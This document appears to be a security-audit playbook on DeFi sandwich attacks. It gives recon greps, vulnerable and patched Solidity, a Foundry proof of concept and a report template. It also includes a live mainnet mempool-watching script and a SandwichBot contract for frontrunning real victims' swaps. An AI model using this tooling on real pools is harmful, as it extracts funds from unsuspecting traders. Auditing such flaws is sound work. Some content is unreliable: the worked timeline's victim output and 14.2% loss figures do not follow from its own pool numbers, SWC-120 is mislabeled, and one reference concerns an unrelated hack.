# Skill: DeFi — Transaction Frontrunning and Sandwich Attacks

## 0. When to Use This Skill
Use this skill when **all** of the following are true:
- Target is a DeFi protocol, AMM, DEX router, or any smart contract that executes token swaps or trades.
- The contract calculates trade output at execution time based on current on-chain state (reserves, price).
- You are looking for MEV (Maximal Extractable Value) extraction vectors, price manipulation, or missing slippage protection.

**Skip this skill if:** The contract uses a fixed-price mechanism (e.g., fixed-rate token sale), implements commit-reveal schemes, or exclusively processes trades through private/encrypted mempools with no public visibility.

---

## 1. Meta-Data
- **Category:** Business Logic / MEV (Maximal Extractable Value)
- **Target Component:** Automated Market Makers (AMMs), Token Swap Functions, DEX Routers, DeFi Protocols
- **Complexity:** Medium — requires understanding of AMM mechanics, transaction ordering, and gas economics
- **Estimated CVSS:** 7.4 (High) when user funds are directly extractable (AV:N/AC:H/PR:N/UI:R/S:C/C:N/I:H/A:N)
- **Reference:** [Flashbots — MEV Taxonomy](https://docs.flashbots.net/), [Ethereum is a Dark Forest — Dan Robinson](https://www.paradigm.xyz/2020/08/ethereum-is-a-dark-forest)

---

## 2. Prerequisites (Trigger Conditions)
- [ ] The contract contains a function that executes trades or swaps based on a dynamic price (e.g., `getAmountOut()`, `getPrice()`, reserve-ratio calculation).
- [ ] The price/output amount is determined at the moment of execution rather than being pre-agreed by the user.
- [ ] The swap function lacks a user-specified minimum output parameter (`minAmountOut`, `amountOutMin`) or the parameter exists but is not enforced before the transfer.
- [ ] The function lacks a `deadline` parameter, or if present, allows excessively long windows (e.g., `block.timestamp + 1 year`).
- [ ] Transactions are submitted to a public mempool where they can be observed before inclusion in a block.
- [ ] The trade size is large enough relative to pool liquidity to produce meaningful price impact.

---

## 3. Reconnaissance & Detection

### 3.1 Locate Swap/Trade Functions

```bash
# Find swap and trade functions
grep -rn "function.*swap\|function.*trade\|function.*exchange\|function.*buy\|function.*sell" --include="*.sol"

# Find price calculation functions
grep -rn "getPrice\|getAmountOut\|getAmountIn\|getReserves\|calcOutput\|quote(" --include="*.sol"

# Find functions that interact with AMM pools
grep -rn "IUniswapV2Pair\|IUniswapV2Router\|ISwapRouter\|IPancakeRouter\|ICurvePool" --include="*.sol"

# Find token transfer patterns within swap functions
grep -rn -A10 "function.*swap" --include="*.sol" | grep -E "\.transfer\(|\.transferFrom\(|safeTransfer"
```

### 3.2 Check for Slippage Protection

```bash
# Search for slippage parameters in function signatures
grep -rn "minAmountOut\|amountOutMin\|amountOutMinimum\|minOutput\|maxAmountIn\|maxPrice\|slippage" --include="*.sol"

# Search for require/assert statements that enforce slippage
grep -rn "require.*>=.*min\|require.*<=.*max\|require.*amount.*Out" --include="*.sol"

# Find swap functions WITHOUT slippage parameters (likely vulnerable)
grep -rn "function.*swap.*(" --include="*.sol" | grep -v "min\|max\|slippage\|deadline"
```

### 3.3 Check for Deadline Protection

```bash
# Look for deadline enforcement
grep -rn "deadline\|expiry\|validUntil\|block\.timestamp" --include="*.sol"

# Find modifier or require patterns for deadlines
grep -rn "require.*deadline\|require.*block.timestamp\|modifier.*ensure\|modifier.*expired" --include="*.sol"
```

### 3.4 Check for Private/Protected Submission Paths

```bash
# Look for commit-reveal patterns (MEV-resistant)
grep -rn "commit\|reveal\|hash.*order\|sealed\|encrypted" --include="*.sol"

# Look for batch auction / frequent batch patterns
grep -rn "batch\|auction\|CoWSwap\|CrocSwap\|settl" --include="*.sol"

# Look for access control on swap functions (private relayer only)
grep -rn "onlyRelayer\|onlyKeeper\|onlyAuthorized\|trustedForwarder" --include="*.sol"
```

### 3.5 Vulnerability Decision Table

| Pattern Found | MEV Risk | Vulnerable? |
|---|---|---|
| Swap function with no `minAmountOut` and no `deadline` | Fully exposed — attacker controls price and timing | **YES — High** |
| Swap function with `minAmountOut` but no enforcement (`require`) | Parameter exists but is cosmetic | **YES — High** |
| Swap function with `minAmountOut = 0` hardcoded or defaulted | Slippage protection is nullified | **YES — High** |
| Swap function with user-supplied `minAmountOut` enforced + no `deadline` | Partial protection — stale tx can be exploited later | **YES — Medium** |
| Swap function with `minAmountOut` enforced + `deadline` enforced | Standard protection — residual MEV within slippage tolerance | **Low risk** — depends on typical slippage settings |
| Swap via commit-reveal or batch auction mechanism | Transaction content hidden from mempool | **No** — MEV-resistant by design |
| Swap via private mempool / Flashbots Protect only | Not visible in public mempool | **Low risk** — depends on relayer trust model |

---

## 4. Exploitation Chain (Step-by-Step)

### Step 1 — Identify the Vulnerable Swap Function
Read the contract and confirm the swap function calculates output at execution time without enforcing a user-specified minimum.

```solidity
// VULNERABLE PATTERN — no slippage protection
function swapTokens(uint256 amountIn) public {
    require(amountIn > 0, "Amount must be greater than zero");

    // Price is fetched at execution time — attacker can manipulate this
    uint256 price = getPrice();
    uint256 amountOut = (amountIn * price) / 1e18;

    tokenIn.transferFrom(msg.sender, address(this), amountIn);
    tokenOut.transfer(msg.sender, amountOut);

    emit TokensSwapped(msg.sender, amountIn, amountOut);
}
```

### Step 2 — Calculate Price Impact and Profit Potential
For constant-product AMMs (`x * y = k`), calculate the price impact of the victim's trade and the attacker's extractable profit.

```python
def calculate_sandwich_profit(
    reserve_x: float,      # Token X reserve in pool
    reserve_y: float,      # Token Y reserve in pool
    victim_amount: float,  # Victim's input amount (Token X)
    fee: float = 0.003     # Pool swap fee (0.3% for Uniswap V2)
) -> dict:
    """
    Calculate sandwich attack profitability on a constant-product AMM.
    Formula: x * y = k (Uniswap V2 style)
    """
    k = reserve_x * reserve_y

    # --- Phase 1: Attacker frontrun ---
    # Attacker buys Token Y with Token X, pushing Y price up
    # Optimal frontrun amount ≈ sqrt(k * victim / fee) - reserve_x (simplified)
    # For estimation, use 50-200% of victim's trade size
    attacker_in = victim_amount * 1.0  # Start with 1x victim's trade

    attacker_in_after_fee = attacker_in * (1 - fee)
    attacker_y_out = (reserve_y * attacker_in_after_fee) / (reserve_x + attacker_in_after_fee)

    new_reserve_x = reserve_x + attacker_in
    new_reserve_y = reserve_y - attacker_y_out

    # --- Phase 2: Victim trade executes at worse price ---
    victim_in_after_fee = victim_amount * (1 - fee)
    victim_y_out = (new_reserve_y * victim_in_after_fee) / (new_reserve_x + victim_in_after_fee)

    # Fair price victim would have gotten without frontrun
    fair_victim_y_out = (reserve_y * victim_in_after_fee) / (reserve_x + victim_in_after_fee)
    victim_loss = fair_victim_y_out - victim_y_out

    post_victim_reserve_x = new_reserve_x + victim_amount
    post_victim_reserve_y = new_reserve_y - victim_y_out

    # --- Phase 3: Attacker backrun — sell Y back for X ---
    attacker_y_in_after_fee = attacker_y_out * (1 - fee)
    attacker_x_back = (post_victim_reserve_x * attacker_y_in_after_fee) / (post_victim_reserve_y + attacker_y_in_after_fee)

    attacker_profit = attacker_x_back - attacker_in
    gas_cost_estimate = 0.01  # ~300K gas at 30 gwei on ETH ≈ 0.01 ETH

    return {
        "attacker_frontrun_input":     attacker_in,
        "attacker_tokens_received":    attacker_y_out,
        "victim_expected_output":      fair_victim_y_out,
        "victim_actual_output":        victim_y_out,
        "victim_loss":                 victim_loss,
        "victim_loss_pct":             f"{(victim_loss / fair_victim_y_out) * 100:.2f}%",
        "attacker_backrun_output":     attacker_x_back,
        "attacker_gross_profit":       attacker_profit,
        "attacker_net_profit":         attacker_profit - gas_cost_estimate,
        "profitable":                  attacker_profit > gas_cost_estimate,
    }

# Example: Pool with 1000 ETH / 2,000,000 USDC, victim swaps 10 ETH
# result = calculate_sandwich_profit(1000, 2_000_000, 10, 0.003)
# Victim loses ~1-2% on a 1% depth trade, attacker profits the difference
```

### Step 3 — Mempool Monitoring (The Surveillance Phase)
The attacker monitors the public mempool for pending swap transactions targeting the vulnerable contract.

```javascript
// Mempool monitoring with ethers.js (conceptual — for authorized testing only)
const { ethers } = require("ethers");

const wsProvider = new ethers.WebSocketProvider("wss://eth-mainnet.alchemyapi.io/v2/YOUR_KEY");
const TARGET_CONTRACT = "0x..."; // Vulnerable swap contract
const SWAP_SELECTOR = "0x..." ; // First 4 bytes of swapTokens(uint256) selector

wsProvider.on("pending", async (txHash) => {
    const tx = await wsProvider.getTransaction(txHash);
    if (!tx || tx.to?.toLowerCase() !== TARGET_CONTRACT.toLowerCase()) return;
    if (!tx.data.startsWith(SWAP_SELECTOR)) return;

    const amountIn = ethers.AbiCoder.defaultAbiCoder().decode(
        ["uint256"],
        "0x" + tx.data.slice(10)
    )[0];

    console.log(`[TARGET] Victim tx: ${txHash}`);
    console.log(`  Amount: ${ethers.formatEther(amountIn)} tokens`);
    console.log(`  Gas Price: ${ethers.formatUnits(tx.gasPrice || 0, "gwei")} gwei`);
    console.log(`  → Frontrun with gas: ${ethers.formatUnits((tx.gasPrice || 0n) + ethers.parseUnits("2", "gwei"), "gwei")} gwei`);
});
```

### Step 4 — Frontrun (The "Push")
The attacker submits their own swap transaction with a higher gas price (priority fee) to ensure it is included before the victim's transaction in the same block.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IVulnerableSwap {
    function swapTokens(uint256 amountIn) external;
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

/// @notice Sandwich attack contract for authorized security testing
contract SandwichBot {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    /// @notice Execute frontrun + backrun in separate transactions
    /// @dev In practice, these are bundled via Flashbots or similar MEV relay
    function frontrun(
        address target,
        address tokenIn,
        uint256 amountIn
    ) external {
        require(msg.sender == owner, "Not owner");
        IERC20(tokenIn).approve(target, amountIn);
        IVulnerableSwap(target).swapTokens(amountIn);
    }

    function backrun(
        address target,
        address tokenIn,
        uint256 amountIn
    ) external {
        require(msg.sender == owner, "Not owner");
        IERC20(tokenIn).approve(target, amountIn);
        IVulnerableSwap(target).swapTokens(amountIn);
    }

    /// @notice Withdraw profits
    function withdraw(address token) external {
        require(msg.sender == owner, "Not owner");
        uint256 balance = IERC20(token).balanceOf(address(this));
        IERC20(token).transfer(owner, balance);
    }
}
```

### Step 5 — Victim Execution at Inflated Price
The victim's transaction executes after the attacker's frontrun. Because the attacker's trade moved the price, the victim receives fewer output tokens than expected.

```
Sandwich Attack Timeline (constant-product AMM):

Pool State:    1000 ETH / 2,000,000 USDC   (price = 2000 USDC/ETH)

T=0  Victim submits: swap 10 ETH → USDC    (expects ~19,940 USDC at fair price)
     Tx sits in public mempool with 20 gwei gas price.

T=1  Attacker sees victim's pending tx.
     Attacker submits frontrun: swap 50 ETH → USDC | Gas: 22 gwei
     Pool after frontrun: 1050 ETH / 1,904,762 USDC  (price ≈ 1814 USDC/ETH)

T=2  Victim's tx executes at the now-worse price.
     Victim receives ~17,113 USDC instead of ~19,940 USDC.
     Victim loss: ~2,827 USDC (14.2% worse).
     Pool after victim: 1060 ETH / 1,887,649 USDC

T=3  Attacker submits backrun: swap 95,238 USDC → ETH | Gas: 18 gwei
     Attacker receives ~50.8 ETH.
     Attacker profit: ~0.8 ETH (~$1,600) minus gas costs (~$5).
```

### Step 6 — Backrun (The "Harvest")
The attacker immediately submits a reverse trade to realize the profit from the price dislocation caused by the victim's forced trade at the worse price.

---

## 5. Code Evidence — Vulnerable vs Patched

### Vulnerable (No Slippage Protection)
```solidity
// VULNERABLE: No minimum output, no deadline
function swapTokens(uint256 amountIn) public {
    uint256 price = getPrice();
    uint256 amountOut = (amountIn * price) / 1e18;

    tokenIn.transferFrom(msg.sender, address(this), amountIn);
    tokenOut.transfer(msg.sender, amountOut);
}
```

### Vulnerable (Slippage Parameter Exists but Not Enforced)
```solidity
// VULNERABLE: minAmountOut is accepted but never checked
function swapTokens(uint256 amountIn, uint256 minAmountOut) public {
    uint256 price = getPrice();
    uint256 amountOut = (amountIn * price) / 1e18;
    // BUG: minAmountOut is ignored — no require statement

    tokenIn.transferFrom(msg.sender, address(this), amountIn);
    tokenOut.transfer(msg.sender, amountOut);
}
```

### Vulnerable (Hardcoded Zero Slippage)
```solidity
// VULNERABLE: Caller wraps an internal swap with minAmountOut = 0
function autoCompound() external {
    uint256 rewards = pendingRewards();
    // Hardcoded 0 slippage — sandwich-able by anyone
    router.swapExactTokensForTokens(
        rewards,
        0,                    // amountOutMin = 0 ← NO PROTECTION
        path,
        address(this),
        block.timestamp
    );
}
```

### Patched (Option A — User-Specified Slippage + Deadline)
```solidity
// SAFE: Enforces minimum output and deadline
function swapTokens(
    uint256 amountIn,
    uint256 amountOutMin,  // User specifies minimum acceptable output
    uint256 deadline       // Transaction expires after this timestamp
) public {
    require(block.timestamp <= deadline, "Transaction expired");

    uint256 amountOut = getAmountOut(amountIn);
    require(amountOut >= amountOutMin, "Insufficient output amount");

    tokenIn.transferFrom(msg.sender, address(this), amountIn);
    tokenOut.transfer(msg.sender, amountOut);
}
```

### Patched (Option B — TWAP Oracle Instead of Spot Price)
```solidity
// SAFE: Uses time-weighted average price, resistant to single-block manipulation
function swapTokens(uint256 amountIn, uint256 amountOutMin) public {
    // TWAP over 30 minutes — cannot be manipulated by a single block's trades
    uint256 twapPrice = oracle.consult(address(tokenIn), amountIn, TWAP_PERIOD);
    require(twapPrice >= amountOutMin, "Price below minimum");

    tokenIn.transferFrom(msg.sender, address(this), amountIn);
    tokenOut.transfer(msg.sender, twapPrice);
}
```

### Patched (Option C — Commit-Reveal Scheme)
```solidity
// SAFE: Trade details hidden until reveal — no mempool visibility
mapping(bytes32 => uint256) public commitTimestamps;
mapping(bytes32 => bool) public revealed;

function commitSwap(bytes32 commitHash) external {
    commitTimestamps[commitHash] = block.timestamp;
}

function revealSwap(
    uint256 amountIn,
    uint256 amountOutMin,
    bytes32 salt
) external {
    bytes32 commitHash = keccak256(abi.encodePacked(msg.sender, amountIn, amountOutMin, salt));
    require(commitTimestamps[commitHash] > 0, "No commit found");
    require(block.timestamp >= commitTimestamps[commitHash] + REVEAL_DELAY, "Too early");
    require(!revealed[commitHash], "Already revealed");

    revealed[commitHash] = true;
    uint256 amountOut = getAmountOut(amountIn);
    require(amountOut >= amountOutMin, "Slippage exceeded");

    tokenIn.transferFrom(msg.sender, address(this), amountIn);
    tokenOut.transfer(msg.sender, amountOut);
}
```

---

## 6. Evasion Techniques & Edge Cases

### 6.1 Gas Price Auction (Priority Gas Auction — PGA)
If the victim increases their gas price to get faster inclusion, the attacker must respond with an even higher gas price. This creates a bidding war that can erode the attacker's profit margin but does not eliminate the vulnerability.

### 6.2 Private Transaction Pools
Attackers use private relayers (Flashbots Protect, MEV Blocker, etc.) to hide their frontrun/backrun transactions from the public mempool. This prevents counter-sandwiching by other MEV searchers.

### 6.3 Multi-Hop Routing Attacks
Even if individual pools have slippage protection, a multi-hop route (A→B→C) can be sandwiched at each hop if the intermediate slippage bounds are loose.

### 6.4 State-Dependent Price Calculation
Even if the price is calculated after a state change within the same function, the vulnerability persists because the attacker's frontrun alters the on-chain state *before* the victim's transaction begins execution.

```solidity
// STILL VULNERABLE: State update before price calc doesn't help
function swapTokens(uint256 amountIn) public {
    balances[msg.sender] -= amountIn;         // State change first
    uint256 price = getPrice();                // Price still reads manipulated reserves
    uint256 amountOut = amountIn * price / 1e18;
    balances[msg.sender] += amountOut;
}
```

### 6.5 Protocol-Level Swaps (autoCompound, Rebalance)
Protocol-internal functions that perform swaps on behalf of the protocol (e.g., auto-compounding yield, rebalancing collateral) are high-value MEV targets because they often hardcode `minAmountOut = 0` and are called on predictable schedules.

### 6.6 Cross-DEX Arbitrage Amplification
Attacker can amplify profit by simultaneously manipulating price across multiple DEXs that share liquidity or reference each other's prices.

---

## 7. PoC Template

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "forge-std/console.sol";

/// @notice Minimal constant-product AMM — vulnerable to sandwich attacks
contract VulnerableAMM {
    uint256 public reserveX = 1000 ether;  // e.g., 1000 ETH
    uint256 public reserveY = 2_000_000e18; // e.g., 2M USDC

    /// @notice Swap Token X for Token Y — NO slippage protection
    function swapXforY(uint256 amountXIn) external returns (uint256 amountYOut) {
        require(amountXIn > 0, "Zero input");

        // Constant product: (x + dx) * (y - dy) = x * y
        // dy = y * dx / (x + dx)
        amountYOut = (reserveY * amountXIn) / (reserveX + amountXIn);

        reserveX += amountXIn;
        reserveY -= amountYOut;

        return amountYOut;
    }

    /// @notice Swap Token Y for Token X — NO slippage protection
    function swapYforX(uint256 amountYIn) external returns (uint256 amountXOut) {
        require(amountYIn > 0, "Zero input");

        amountXOut = (reserveX * amountYIn) / (reserveY + amountYIn);

        reserveY += amountYIn;
        reserveX -= amountXOut;

        return amountXOut;
    }

    function getSpotPrice() external view returns (uint256) {
        return (reserveY * 1e18) / reserveX;
    }
}

contract SandwichAttackTest is Test {
    VulnerableAMM amm;

    function setUp() public {
        amm = new VulnerableAMM();
    }

    function test_sandwichAttack() public {
        uint256 victimInput = 10 ether; // Victim swaps 10 ETH
        uint256 attackerInput = 50 ether; // Attacker frontruns with 50 ETH

        // --- Baseline: What victim would get WITHOUT sandwich ---
        uint256 fairOutput = (amm.reserveY() * victimInput) / (amm.reserveX() + victimInput);
        uint256 priceBefore = amm.getSpotPrice();

        console.log("=== SANDWICH ATTACK PoC ===");
        console.log("Pool initial: %s ETH / %s USDC", amm.reserveX() / 1e18, amm.reserveY() / 1e18);
        console.log("Spot price before: %s USDC/ETH", priceBefore / 1e18);
        console.log("Victim input: %s ETH", victimInput / 1e18);
        console.log("Victim fair output (no attack): %s USDC", fairOutput / 1e18);

        // --- Step 1: Attacker FRONTRUNS — buys Y with X ---
        uint256 attackerYReceived = amm.swapXforY(attackerInput);
        uint256 priceAfterFrontrun = amm.getSpotPrice();
        console.log("\n--- Attacker Frontrun ---");
        console.log("Attacker input: %s ETH", attackerInput / 1e18);
        console.log("Attacker received: %s USDC", attackerYReceived / 1e18);
        console.log("Spot price after frontrun: %s USDC/ETH", priceAfterFrontrun / 1e18);

        // --- Step 2: Victim's trade executes at WORSE price ---
        uint256 victimActualOutput = amm.swapXforY(victimInput);
        console.log("\n--- Victim Trade (sandwiched) ---");
        console.log("Victim actual output: %s USDC", victimActualOutput / 1e18);
        console.log("Victim loss: %s USDC", (fairOutput - victimActualOutput) / 1e18);

        // --- Step 3: Attacker BACKRUNS — sells Y back for X ---
        uint256 attackerXBack = amm.swapYforX(attackerYReceived);
        console.log("\n--- Attacker Backrun ---");
        console.log("Attacker sells back: %s USDC", attackerYReceived / 1e18);
        console.log("Attacker receives: %s ETH", attackerXBack / 1e18);

        // --- Results ---
        int256 attackerProfit = int256(attackerXBack) - int256(attackerInput);
        uint256 victimLoss = fairOutput - victimActualOutput;
        uint256 victimLossPct = (victimLoss * 10000) / fairOutput; // basis points

        console.log("\n=== RESULTS ===");
        console.log("Attacker profit: %s ETH", attackerProfit > 0 ? uint256(attackerProfit) / 1e18 : 0);
        console.log("Victim loss: %s USDC (%s bps)", victimLoss / 1e18, victimLossPct);

        // --- Assertions ---
        // Victim got LESS than they would have without the sandwich
        assertLt(victimActualOutput, fairOutput, "Victim should receive less due to sandwich");

        // Attacker should profit (in a real pool with fees, profitability depends on trade sizes)
        assertGt(attackerXBack, attackerInput, "Attacker should profit from the sandwich");

        if (attackerProfit > 0) {
            emit log("[VULNERABLE] Sandwich attack is profitable — contract lacks slippage protection");
        }
    }

    function test_protectedSwapPreventsAttack() public {
        // Demonstrate that minAmountOut would prevent the attack
        uint256 victimInput = 10 ether;
        uint256 attackerInput = 50 ether;

        // Fair output without attack
        uint256 fairOutput = (amm.reserveY() * victimInput) / (amm.reserveX() + victimInput);
        // Victim sets 1% max slippage
        uint256 minAmountOut = (fairOutput * 99) / 100;

        // Attacker frontruns
        amm.swapXforY(attackerInput);

        // Victim's trade would produce less than minAmountOut
        uint256 actualOutput = (amm.reserveY() * victimInput) / (amm.reserveX() + victimInput);

        console.log("=== SLIPPAGE PROTECTION TEST ===");
        console.log("Fair output: %s USDC", fairOutput / 1e18);
        console.log("Min acceptable (1%% slippage): %s USDC", minAmountOut / 1e18);
        console.log("Actual output after frontrun: %s USDC", actualOutput / 1e18);

        if (actualOutput < minAmountOut) {
            console.log("[PROTECTED] Trade would revert — slippage exceeded");
            console.log("Sandwich attack BLOCKED by slippage protection");
        }

        assertLt(actualOutput, minAmountOut, "Frontrun should push output below slippage tolerance");
    }
}
```

**Run the PoC:**
```bash
# Using Foundry
forge test --match-contract SandwichAttackTest -vvv

# With gas reporting
forge test --match-contract SandwichAttackTest -vvv --gas-report
```

---

## 8. Report Template

### Title
`[High] MEV: Missing Slippage Protection in <function_name>() Enables Transaction Frontrunning and Sandwich Attacks`

### Summary
The `<function_name>()` function in `<file_path>` executes token swaps using a price calculated at execution time via `<price_function>()` without requiring the user to specify a minimum acceptable output amount (`minAmountOut`) or a transaction deadline. An attacker monitoring the public mempool can sandwich the victim's transaction by:
1. Frontrunning with a large trade to shift the price unfavorably.
2. Allowing the victim's trade to execute at the worse price.
3. Backrunning to reverse their position and extract the price difference as profit.

This results in direct financial loss for every user of the swap function proportional to their trade size and the pool's liquidity depth.

### Impact
- **Direct fund extraction:** Users receive fewer tokens than they would at the fair market price. Losses scale with trade size relative to pool liquidity.
- **Systematic exploitation:** MEV bots continuously monitor the mempool and will exploit every unprotected swap automatically.
- **Protocol credibility damage:** Users experiencing consistently worse execution will abandon the protocol.
- **Compounding with protocol swaps:** If the protocol itself calls `<function_name>()` internally (e.g., for auto-compounding or rebalancing), protocol-owned funds are also at risk.

### Severity
**High** — CVSS 7.4 (AV:N/AC:H/PR:N/UI:R/S:C/C:N/I:H/A:N)

Escalates to **Critical** if the protocol performs automated swaps with hardcoded `minAmountOut = 0` (AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:H/A:N → CVSS 8.6).

### Steps to Reproduce
1. Deploy the vulnerable contract on a local fork (e.g., `forge test --fork-url <RPC>`).
2. Observe that `<function_name>()` accepts only `amountIn` with no `minAmountOut` or `deadline` parameter.
3. Simulate a victim's swap transaction of `<amount>` tokens.
4. Submit a frontrunning transaction with a higher gas price that executes the same swap function with a larger amount, shifting the price.
5. Observe the victim's transaction executes at a worse price, receiving fewer tokens than the fair-market output.
6. Submit a backrunning transaction that reverses the attacker's position for a net profit.
7. Run the provided Foundry PoC: `forge test --match-test test_sandwichAttack -vvv`

### Recommended Fix
1. **Required:** Add a `amountOutMin` parameter that the user must set, enforced with a `require(amountOut >= amountOutMin)` check before executing the transfer.
2. **Required:** Add a `deadline` parameter enforced with `require(block.timestamp <= deadline)` to prevent stale transactions from being held and executed later at an unfavorable price.
3. **Optional enhancement:** Use a TWAP oracle instead of spot price to reduce single-block manipulation effectiveness.
4. **Optional enhancement:** Implement a commit-reveal scheme for high-value trades to hide trade intent from the mempool.

---

## 9. References
- [Flashbots — MEV Taxonomy and Documentation](https://docs.flashbots.net/)
- [Ethereum is a Dark Forest — Dan Robinson & Georgios Konstantopoulos (Paradigm)](https://www.paradigm.xyz/2020/08/ethereum-is-a-dark-forest)
- [Escaping the Dark Forest — samczsun](https://samczsun.com/escaping-the-dark-forest/)
- [Flash Boys 2.0: Frontrunning in Decentralized Exchanges (Daian et al.)](https://arxiv.org/abs/1904.05234)
- [Uniswap V2 Router — amountOutMin Pattern](https://docs.uniswap.org/contracts/v2/reference/smart-contracts/router-02)
- [SWC-120: Weak Sources of Randomness / Transaction Ordering Dependence](https://swcregistry.io/docs/SWC-120)
- [MEV Blocker — Protecting Users from MEV](https://mevblocker.io/)
- [OpenZeppelin: Frontrunning Prevention Patterns](https://blog.openzeppelin.com/15-lines-of-code-that-could-have-prevented-thedao-hack-782499e00942)
